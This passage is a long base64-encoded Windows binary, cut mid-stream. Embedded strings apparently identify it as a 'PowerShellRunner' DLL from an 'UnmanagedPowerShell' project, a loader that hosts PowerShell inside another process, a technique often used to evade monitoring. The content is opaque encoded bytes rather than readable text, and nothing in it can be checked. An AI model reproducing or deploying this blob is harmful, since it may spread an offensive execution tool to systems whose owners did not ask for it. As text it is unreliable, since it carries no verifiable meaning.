ABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgYFSAGUAYQBkAEwAaQBuAGUAQQBzAFMAZQBjAHUAcgBlAFMAdAByAGkAbgBnACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABSUYAbAB1AHMAaABJAG4AcAB1AHQAQgB1AGYAZgBlAHIAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuAABLRwBlAHQAQgB1AGYAZgBlAHIAQwBvAG4AdABlAG4AdABzACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAAQUsAZQB5AEEAdgBhAGkAbABhAGIAbABlACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAAgWNSAGUAYQBkAEsAZQB5ACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4Ac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AAAkD8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAguAEQAAAAACC4ARABAQAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAIAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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